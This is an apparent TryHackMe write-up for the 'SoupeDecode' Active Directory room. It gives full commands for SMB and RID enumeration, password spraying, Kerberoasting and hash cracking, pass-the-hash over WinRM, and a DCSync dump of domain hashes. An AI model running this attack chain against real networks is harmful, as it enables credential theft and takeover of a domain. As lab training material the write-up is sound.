---
title: "SoupeDecode - TryHackMe Writeup"
date: 2026-07-05
draft: false
summary: "Writeup for SoupeDecode challenge on TryHackMe."
tags: ["Active Directory", "brute force", "kerberoast", "smb", "misconfigured privs", "pass the hash", "windows"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/soupedecode/cover.webp"
  caption: "SoupeDecode TryHackMe Challenge"
  alt: "SoupeDecode cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

Test your enumeration skills on this boot-to-root machine.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/soupedecode01

## Enumeration

I performed an **nmap** aggressive scan to find open ports:

```
nmap -A -p- TARGET --min-rate 10000
```

![performing an nmap scan on soupedecode|257](https://cdn.ziomsec.com/soupedecode/1.webp)

## User Flag

### Finding User Creds

I enumerated the SMB shares using guest session.

```
nxc smb TARGET -u 'guest' -p '' --shares
```

![enumerating shares](https://cdn.ziomsec.com/soupedecode/2.webp)

I then enumerated users by brute forcing the rid's

```
nxc smb TARGET -u 'guest' -p '' --rid-brute | tee users.txt
```

![bruteforcing users](https://cdn.ziomsec.com/soupedecode/3.webp)

From this, I extracted usernames to use for bruteforce

```
cat users.txt | awk -F'\\\\| \\(' '/SidTypeUser/ {print $2}' | tee users.lst
```

![extracting users to create a wordlist](https://cdn.ziomsec.com/soupedecode/4.webp)

Since I had no other leads, I decided to attempt to bruteforce the password for the discovered users. Since this was a CTF chal, instead of using a wordlist like `rockyou` which would take a very long time, I used the user list to find users who were using their username as their password.

```
nxc ldap TARGET -u users.lst -p users.lst -d soupedecode.local --continue-on-success --no-bruteforce
```
- The `--no-bruteforce` flags allows us to spray when using file for username and password (user1 => password1, user2 => password2)
- The `--continue-on-success` allows us to continue the bruteforce after finding a valid credential.

![bruteforcing user credentials](https://cdn.ziomsec.com/soupedecode/5.webp)

### Capturing The User Flag

I used the discovered creds of `ybob317` to enumerate its perms on the SMB shares. With it, I had read permission in the Users share, so I connected to it and found some user directories.

```
nxc smb TARGET -u ybob317 -p ybob317 --shares
smbclient //TARGET/Users -U soupedecode.local/ybob317
```

![connecting to the Users share](https://cdn.ziomsec.com/soupedecode/6.webp)

I listed the contents of `ybob317`'s directory, and found the user flag in Desktop

```
cd ybob317
cd Desktop
get user.txt
```

![listing user directory](https://cdn.ziomsec.com/soupedecode/7.webp)

![downloading the user flag](https://cdn.ziomsec.com/soupedecode/8.webp)

![reading the user flag](https://cdn.ziomsec.com/soupedecode/9.webp)

## Root Flag

### Kerberoasting

I listed kerberoastable users and found 5 accounts

```
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip TARGET
```

![listing kerberoastable accounts](https://cdn.ziomsec.com/soupedecode/10.webp)

I then dumped the hashes for those accounts and saved them in a separate file

```
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 -dc-ip TARGET -request
```

![dumping kerberoasting hash](https://cdn.ziomsec.com/soupedecode/11.webp)

I then used **john** to crack these hashes and out of the 5 hashes, I was able to crack the hash of `file_svc`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt file_svc.hash
```

![Cracking file_svc hash](https://cdn.ziomsec.com/soupedecode/12.webp)

### Pass The Hash

I used the discovered credential to enumerate permissions on the SMB shares and found I had read permission on the `backup` share. I connected to it and found a txt file containing user hashes.

```
nxc smb TARGET -u file_svc -p 'Password123!!' --shares
smbclient //TARGET/backup -U file_svc
get backup_extract.txt
```

![downloading backup_extract file](https://cdn.ziomsec.com/soupedecode/13.webp)

![user hashes](https://cdn.ziomsec.com/soupedecode/14.webp)

I created a wordlist out of this, one with usernames and one with the hashes. I then validated which one of these credentials are still valid and found one with exec perms on the machine

```
nxc smb TARGET -u users2.lst -H hashes.lst --continue-on-success --no-bruteforce
```

![validating creds](https://cdn.ziomsec.com/soupedecode/15.webp)

### Capturing The Root Flag

I used these credentials to log into the system via WinRM

```
evil-winrm -i TARGET -u FileServer$ -H LM_HASH
```

![connecting to the machine via WinRM](https://cdn.ziomsec.com/soupedecode/16.webp)

This account had privileged access on the box.

```
whoami /priv
```

![inspecting user privilege](https://cdn.ziomsec.com/soupedecode/17.webp)

Hence, I was able to capture the root flag from Administrator's directory

```
cd Administrator/Desktop
cat root.txt
```

![finding the root flag](https://cdn.ziomsec.com/soupedecode/18.webp)

![capturing the root flag](https://cdn.ziomsec.com/soupedecode/19.webp)

### Dumping Domain Hashes

As I had admin privs on the DC, I could perform dc-sync to dump all domain hashes using the `FileServer` machine credentials.

```
impacket-secretsdump soupedecode.local/'FileServer$'@TARGET -hashes NTLM_HASH -just-dc
```

![performing dc-sync](https://cdn.ziomsec.com/soupedecode/20.webp)

That's it from my end! Until next time.

---